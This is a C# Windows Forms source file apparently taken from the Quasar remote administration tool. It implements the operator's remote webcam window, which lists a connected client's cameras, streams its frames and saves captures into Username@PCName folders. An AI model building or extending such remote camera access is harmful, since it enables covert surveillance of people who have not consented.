using Quasar.Common.Messages;
using Quasar.Server.Helper;
using Quasar.Server.Messages;
using Quasar.Server.Networking;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;

namespace Quasar.Server.Forms
{
    public partial class FrmRemoteWebcam : Form
    {
        /// <summary>
        /// The client which can be used for the remote webcam.
        /// </summary>
        private readonly Client _connectClient;

        /// <summary>
        /// The message handler for handling the communication with the client.
        /// </summary>
        private readonly RemoteWebcamHandler _remoteWebcamHandler;

        /// <summary>
        /// Holds the opened remote webcam form for each client.
        /// </summary>
        private static readonly Dictionary<Client, FrmRemoteWebcam> OpenedForms = new Dictionary<Client, FrmRemoteWebcam>();

        /// <summary>
        /// Creates a new remote webcam form for the client or gets the current open form, if there exists one already.
        /// </summary>
        /// <param name="client">The client used for the remote webcam form.</param>
        /// <returns>
        /// Returns a new remote webcam form for the client if there is none currently open, otherwise returns the existing one.
        /// </returns>
        public static FrmRemoteWebcam CreateNewOrGetExisting(Client client)
        {
            if (OpenedForms.ContainsKey(client))
            {
                return OpenedForms[client];
            }
            FrmRemoteWebcam f = new FrmRemoteWebcam(client);
            f.Disposed += (sender, args) => OpenedForms.Remove(client);
            OpenedForms.Add(client, f);
            return f;
        }

        /// <summary>
        /// Initializes a new instance of the <see cref="FrmRemoteWebcam"/> class using the given client.
        /// </summary>
        /// <param name="client">The client used for the remote webcam form.</param>
        public FrmRemoteWebcam(Client client)
        {
            _connectClient = client;
            _remoteWebcamHandler = new RemoteWebcamHandler(client);

            RegisterMessageHandler();
            InitializeComponent();
        }

        /// <summary>
        /// Called whenever a client disconnects.
        /// </summary>
        /// <param name="client">The client which disconnected.</param>
        /// <param name="connected">True if the client connected, false if disconnected</param>
        private void ClientDisconnected(Client client, bool connected)
        {
            if (!connected)
            {
                this.Invoke((MethodInvoker)this.Close);
            }
        }

        /// <summary>
        /// Registers the remote webcam message handler for client communication.
        /// </summary>
        private void RegisterMessageHandler()
        {
            _connectClient.ClientState += ClientDisconnected;
            _remoteWebcamHandler.WebcamsChanged += WebcamsChanged;
            _remoteWebcamHandler.ProgressChanged += UpdateFrame;
            _remoteWebcamHandler.StatusChanged += OnStatusChanged;
            MessageHandler.Register(_remoteWebcamHandler);
        }

        /// <summary>
        /// Unregisters the remote webcam message handler.
        /// </summary>
        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(_remoteWebcamHandler);
            _remoteWebcamHandler.WebcamsChanged -= WebcamsChanged;
            _remoteWebcamHandler.ProgressChanged -= UpdateFrame;
            _remoteWebcamHandler.StatusChanged -= OnStatusChanged;
            _connectClient.ClientState -= ClientDisconnected;
        }

        /// <summary>
        /// Called whenever the streaming status changes (camera initializing, error, etc.).
        /// </summary>
        private void OnStatusChanged(object sender, string statusText)
        {
            if (lblStatus.InvokeRequired)
            {
                lblStatus.Invoke((MethodInvoker)(() => lblStatus.Text = statusText));
            }
            else
            {
                lblStatus.Text = statusText;
            }
        }

        /// <summary>
        /// Called whenever the remote webcam devices changed.
        /// </summary>
        private void WebcamsChanged(object sender, string[] webcamNames)
        {
            cbWebcams.Items.Clear();
            foreach (string name in webcamNames)
            {
                cbWebcams.Items.Add(name);
            }
            if (cbWebcams.Items.Count > 0)
                cbWebcams.SelectedIndex = 0;

            lblStatus.Text = cbWebcams.Items.Count > 0
                ? $"{cbWebcams.Items.Count} webcam(s) found"
                : "No webcams found";
        }

        /// <summary>
        /// Updates the current webcam frame by drawing it to the picturebox.
        /// </summary>
        private void UpdateFrame(object sender, Bitmap bmp)
        {
            try
            {
                var oldImage = picWebcam.Image;
                picWebcam.Image = new Bitmap(bmp, picWebcam.Size);
                oldImage?.Dispose();
                bmp.Dispose();
            }
            catch (Exception)
            {
                bmp?.Dispose();
            }
        }

        private void FrmRemoteWebcam_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("Remote Webcam", _connectClient);
            barQuality.Value = 75;
            barQuality_Scroll(sender, e);
            _remoteWebcamHandler.RefreshWebcams();
        }

        private void FrmRemoteWebcam_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (_remoteWebcamHandler.IsStarted)
                StopStream();
            UnregisterMessageHandler();
            _remoteWebcamHandler.Dispose();
            picWebcam.Image?.Dispose();
        }

        private void FrmRemoteWebcam_Resize(object sender, EventArgs e)
        {
            panelTop.Left = (this.ClientSize.Width - panelTop.Width) / 2;
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            if (cbWebcams.Items.Count == 0)
            {
                MessageBox.Show("No remote webcam detected.\nPlease wait till the client sends a list with available webcams.",
                    "Starting failed", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            StartStream();
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            StopStream();
        }

        /// <summary>
        /// Starts the webcam stream.
        /// </summary>
        private void StartStream()
        {
            btnStart.Enabled = false;
            btnStop.Enabled = true;
            cbWebcams.Enabled = false;
            barQuality.Enabled = false;
            btnCapture.Enabled = true;
            lblStatus.Text = "Initializing camera...";

            _remoteWebcamHandler.BeginReceiveFrames(cbWebcams.SelectedIndex, barQuality.Value);
        }

        /// <summary>
        /// Stops the webcam stream.
        /// </summary>
        private void StopStream()
        {
            btnStart.Enabled = true;
            btnStop.Enabled = false;
            cbWebcams.Enabled = true;
            barQuality.Enabled = true;
            btnCapture.Enabled = false;
            lblStatus.Text = "Stopped";

            _remoteWebcamHandler.EndReceiveFrames();
        }

        private void barQuality_Scroll(object sender, EventArgs e)
        {
            int value = barQuality.Value;
            lblQualityShow.Text = value.ToString();

            if (value < 25)
                lblQualityShow.Text += " (low)";
            else if (value >= 85)
                lblQualityShow.Text += " (best)";
            else if (value >= 75)
                lblQualityShow.Text += " (high)";
            else if (value >= 25)
                lblQualityShow.Text += " (mid)";
        }

        private void btnRefresh_Click(object sender, EventArgs e)
        {
            lblStatus.Text = "Refreshing...";
            _remoteWebcamHandler.RefreshWebcams();
        }

        private void btnCapture_Click(object sender, EventArgs e)
        {
            if (picWebcam.Image == null)
            {
                MessageBox.Show("No webcam frame available to capture.",
                    "Capture failed", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            try
            {
                // Create client folder path: Clients\Username@PCName\Captures
                string clientFolder = Path.Combine(
                    Application.StartupPath,
                    "Clients",
                    string.Format("{0}@{1}", _connectClient.Value.Username, _connectClient.Value.PcName));

                string capturesFolder = Path.Combine(clientFolder, "Captures");

                if (!Directory.Exists(capturesFolder))
                    Directory.CreateDirectory(capturesFolder);

                string fileName = string.Format("Webcam_{0}.png",
                    DateTime.Now.ToString("yyyy-MM-dd_HH-mm-ss"));

                string filePath = Path.Combine(capturesFolder, fileName);

                using (var bmp = new Bitmap(picWebcam.Image))
                {
                    bmp.Save(filePath, ImageFormat.Png);
                }

                lblStatus.Text = $"Captured: {fileName}";
            }
            catch (Exception ex)
            {
                MessageBox.Show("Failed to save capture: " + ex.Message,
                    "Capture failed", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
    }
}
